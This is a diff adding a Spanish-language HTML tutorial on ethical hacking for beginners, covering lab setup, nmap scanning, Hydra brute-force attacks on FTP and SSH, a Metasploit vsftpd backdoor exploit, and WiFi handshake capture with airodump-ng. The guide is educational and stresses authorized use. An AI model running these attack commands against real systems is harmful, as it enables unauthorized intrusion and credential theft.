@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía Completa de Hacking Ético para Principiantes</title>
+    <style>
+        :root {
+            --primary: #3498db;
+            --secondary: #2980b9;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+            --success: #2ecc71;
+            --warning: #f39c12;
+            --danger: #e74c3c;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark);
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        h1, h2, h3, h4 {
+            color: var(--primary);
+        }
+        h1 {
+            text-align: center;
+            border-bottom: 3px solid var(--primary);
+            padding-bottom: 10px;
+        }
+        .module-container {
+            background-color: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 30px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background-color: #ffebee;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 4px solid var(--danger);
+        }
+        .note {
+            background-color: #fff8e1;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 4px solid var(--warning);
+        }
+        .terminal {
+            background-color: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-x: auto;
+        }
+        .terminal .prompt { color: var(--success); }
+        .terminal .comment { color: #7f8c8d; }
+        .step {
+            margin-bottom: 25px;
+            padding-left: 30px;
+            position: relative;
+            border-left: 3px solid var(--primary);
+        }
+        .step-number {
+            position: absolute;
+            left: -15px;
+            top: 0;
+            background-color: var(--primary);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .comparison-table th, .comparison-table td {
+            padding: 12px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        .comparison-table th {
+            background-color: var(--primary);
+            color: white;
+        }
+        .definition-box {
+            background-color: #e3f2fd;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        .tab {
+            padding: 10px 20px;
+            background: #ddd;
+            cursor: pointer;
+            margin-right: 5px;
+            border-radius: 5px 5px 0 0;
+        }
+        .tab.active {
+            background: var(--primary);
+            color: white;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        @media (max-width: 768px) {
+            .step {
+                padding-left: 25px;
+            }
+            .step-number {
+                left: -12px;
+                width: 25px;
+                height: 25px;
+                font-size: 0.8em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>🔐 Guía Definitiva de Hacking Ético para Principiantes</h1>
+
+    <div class="warning">
+        <h2>⚠️ Advertencia Legal y Ética</h2>
+        <p>Todas las técnicas aquí descritas deben usarse <strong>exclusivamente</strong> en:</p>
+        <ul>
+            <li>Tus propios sistemas y redes</li>
+            <li>Sistemas con permiso explícito por escrito</li>
+            <li>Entornos de laboratorio controlados</li>
+        </ul>
+        <p>El acceso no autorizado a sistemas informáticos es un delito en la mayoría de países.</p>
+    </div>
+
+    <div class="module-container">
+        <h2>📚 Glosario de Términos Esenciales</h2>
+        
+        <div class="definition-box">
+            <h3>Pentesting (Pruebas de Penetración)</h3>
+            <p>Evaluación autorizada de la seguridad de un sistema mediante la simulación de ataques.</p>
+        </div>
+        
+        <div class="definition-box">
+            <h3>Vulnerabilidad</h3>
+            <p>Debilidad o fallo en un sistema que puede ser explotado para comprometer su seguridad.</p>
+        </div>
+        
+        <div class="definition-box">
+            <h3>Exploit</h3>
+            <p>Código o técnica que aprovecha una vulnerabilidad para obtener acceso no autorizado.</p>
+        </div>
+        
+        <div class="definition-box">
+            <h3>Payload</h3>
+            <p>Código ejecutable que se entrega después de una explotación exitosa.</p>
+        </div>
+        
+        <div class="definition-box">
+            <h3>Fuerza Bruta</h3>
+            <p>Método de prueba de credenciales mediante intentos sistemáticos.</p>
+        </div>
+    </div>
+
+    <div class="module-container">
+        <h2>🛠️ Configuración del Entorno de Práctica</h2>
+        
+        <div class="tab-container">
+            <div class="tab active" onclick="openTab(event, 'kali-tab')">Kali Linux</div>
+            <div class="tab" onclick="openTab(event, 'windows-tab')">Windows 11</div>
+            <div class="tab" onclick="openTab(event, 'virtual-tab')">Entornos Virtuales</div>
+        </div>
+        
+        <div id="kali-tab" class="tab-content active">
+            <h3>Instalación de Kali Linux</h3>
+            <div class="step">
+                <div class="step-number">1</div>
+                <p>Descarga la imagen ISO desde <a href="https://www.kali.org/get-kali/" target="_blank">kali.org</a></p>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <p>Crea un USB booteable con Rufus o BalenaEtcher</p>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <p>Instala en máquina virtual (VirtualBox/VMware) o en hardware dedicado</p>
+            </div>
+            <div class="terminal">
+                <span class="prompt">$</span> sudo apt update && sudo apt upgrade -y  <span class="comment"># Actualizar sistema</span><br>
+                <span class="prompt">$</span> sudo apt install -y git curl nmap wireshark  <span class="comment"># Herramientas básicas</span>
+            </div>
+        </div>
+        
+        <div id="windows-tab" class="tab-content">
+            <h3>Configuración en Windows 11</h3>
+            <div class="step">
+                <div class="step-number">1</div>
+                <p>Instala Windows Subsystem for Linux (WSL)</p>
+                <div class="terminal">
+                    <span class="prompt">PS></span> wsl --install -d Ubuntu
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <p>Instala herramientas básicas</p>
+                <div class="terminal">
+                    <span class="prompt">PS></span> winget install nmap wireshark
+                </div>
+            </div>
+        </div>
+        
+        <div id="virtual-tab" class="tab-content">
+            <h3>Laboratorio Virtual Recomendado</h3>
+            <ul>
+                <li><strong>Kali Linux</strong>: Sistema ofensivo</li>
+                <li><strong>Metasploitable2</strong>: Blanco de práctica</li>
+                <li><strong>Windows 10 Vulnerable</strong>: Para AD y redes Windows</li>
+            </ul>
+            <div class="terminal">
+                <span class="comment"># Configurar red en VirtualBox:</span><br>
+                1. Archivo > Preferencias > Red<br>
+                2. Crear nueva red "Host-Only"<br>
+                3. Asignar a todas las VMs
+            </div>
+        </div>
+    </div>
+
+    <div class="module-container">
+        <h2>🔍 Técnicas Básicas de Reconocimiento</h2>
+        
+        <div class="step">
+            <div class="step-number">1</div>
+            <h3>Descubrimiento de Red</h3>
+            <div class="terminal">
+                <span class="comment"># En Kali Linux:</span><br>
+                <span class="prompt">$</span> sudo nmap -sn 192.168.1.0/24  <span class="comment"># Escanear hosts activos</span><br><br>
+                
+                <span class="comment"># En Windows:</span><br>
+                <span class="prompt">PS></span> Test-NetConnection -ComputerName 192.168.1.1 -Port 80
+            </div>
+        </div>
+        
+        <div class="step">
+            <div class="step-number">2</div>
+            <h3>Escaneo de Puertos</h3>
+            <div class="terminal">
+                <span class="comment"># Escaneo básico:</span><br>
+                <span class="prompt">$</span> sudo nmap -sS -T4 192.168.1.1  <span class="comment"># SYN Scan (Kali)</span><br>
+                <span class="prompt">PS></span> nmap -T4 -A 192.168.1.1  <span class="comment"># Windows (con Nmap instalado)</span><br><br>
+                
+                <span class="comment"># Escanear servicios y versiones:</span><br>
+                <span class="prompt">$</span> sudo nmap -sV -sC 192.168.1.1
+            </div>
+        </div>
+    </div>
+
+    <div class="module-container">
+        <h2>⚔️ Técnicas de Explotación Básica</h2>
+        
+        <div class="step">
+            <div class="step-number">1</div>
+            <h3>Fuerza Bruta a Servicios</h3>
+            <div class="terminal">
+                <span class="comment"># FTP (Kali Linux):</span><br>
+                <span class="prompt">$</span> hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.1<br><br>
+                
+                <span class="comment"># SSH (Windows con Hydra):</span><br>
+                <span class="prompt">PS></span> hydra -L usuarios.txt -P claves.txt ssh://192.168.1.1
+            </div>
+        </div>
+        
+        <div class="step">
+            <div class="step-number">2</div>
+            <h3>Uso Básico de Metasploit</h3>
+            <div class="terminal">
+                <span class="prompt">$</span> msfconsole<br>
+                msf6 > search vsftpd  <span class="comment"># Buscar exploits</span><br>
+                msf6 > use exploit/unix/ftp/vsftpd_234_backdoor<br>
+                msf6 > set RHOSTS 192.168.1.1<br>
+                msf6 > exploit
+            </div>
+        </div>
+    </div>
+
+    <div class="module-container">
+        <h2>📡 Análisis de Redes WiFi (Ético)</h2>
+        
+        <div class="warning">
+            Solo realizar en tu propia red o con permiso explícito por escrito.
+        </div>
+        
+        <div class="step">
+            <div class="step-number">1</div>
+            <h3>Configurar Modo Monitor</h3>
+            <div class="terminal">
+                <span class="prompt">$</span> sudo airmon-ng check kill<br>
+                <span class="prompt">$</span> sudo airmon-ng start wlan0<br>
+                <span class="prompt">$</span> iwconfig  <span class="comment"># Verificar modo monitor</span>
+            </div>
+        </div>
+        
+        <div class="step">
+            <div class="step-number">2</div>
+            <h3>Escaneo de Redes WiFi</h3>
+            <div class="terminal">
+                <span class="prompt">$</span> sudo airodump-ng wlan0mon<br><br>
+                <span class="comment"># Capturar handshake (solo en tu red):</span><br>
+                <span class="prompt">$</span> sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
+            </div>
+        </div>
+    </div>
+
+    <div class="module-container">
+        <h2>🎓 Recursos para Continuar Aprendiendo</h2>
+        
+        <table class="comparison-table">
+            <tr>
+                <th>Plataforma</th>
+                <th>Tipo</th>
+                <th>Nivel</th>
+                <th>Enlace</th>
+            </tr>
+            <tr>
+                <td>TryHackMe</td>
+                <td>Cursos guiados</td>
+                <td>Principiante-Intermedio</td>
+                <td><a href="https://tryhackme.com/" target="_blank">tryhackme.com</a></td>
+            </tr>
+            <tr>
+                <td>Hack The Box</td>
+                <td>Máquinas retadoras</td>
+                <td>Intermedio-Avanzado</td>
+                <td><a href="https://www.hackthebox.com/" target="_blank">hackthebox.com</a></td>
+            </tr>
+            <tr>
+                <td>OverTheWire</td>
+                <td>Juegos de guerra</td>
+                <td>Todos los niveles</td>
+                <td><a href="https://overthewire.org/wargames/" target="_blank">overthewire.org</a></td>
+            </tr>
+        </table>
+    </div>
+
+    <script>
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            
+            tabcontent = document.getElementsByClassName("tab-content");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].className = tabcontent[i].className.replace(" active", "");
+            }
+            
+            tablinks = document.getElementsByClassName("tab");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            
+            document.getElementById(tabName).className += " active";
+            evt.currentTarget.className += " active";
+        }
+    </script>
+</body>
+</html>
